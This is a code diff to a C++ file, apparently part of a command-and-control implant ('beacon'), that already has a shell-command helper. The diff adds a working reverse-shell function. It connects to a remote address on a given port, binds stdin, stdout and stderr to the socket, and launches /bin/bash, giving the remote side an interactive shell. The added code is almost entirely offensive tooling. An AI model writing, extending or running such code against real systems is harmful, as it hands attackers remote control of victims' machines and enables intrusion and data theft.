@@ -1,6 +1,11 @@
 #include <string>
+#include <vector>
 #include <array>
 #include <include/beacon.hpp>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+typedef std::vector<std::string> ARGS;
 
 std::string exec(const char* cmd){
     std::array<char, 128> buffer;
@@ -13,4 +18,34 @@ std::string exec(const char* cmd){
         result += buffer.data();
     }
     return result;
+}
+
+int revshell(ARGS args){
+    if (args.size() != 1){
+        return 1;
+    }
+    int port;
+    try {
+        port = std::stoi(args[0]);
+    }
+    catch (...){
+        return 1;
+    }
+    struct sockaddr_in sa;
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(port);
+    sa.sin_addr.s_addr = inet_addr(get_ip_addr());
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sleep(1);
+    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0){
+        return 101;
+    }
+    
+    dup2(sockfd, 0); //bind stdin to sock
+    dup2(sockfd, 1); //bind stdout to sock
+    dup2(sockfd, 2); //bind stderr to sock
+
+    char *const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
+    return 0;
 }
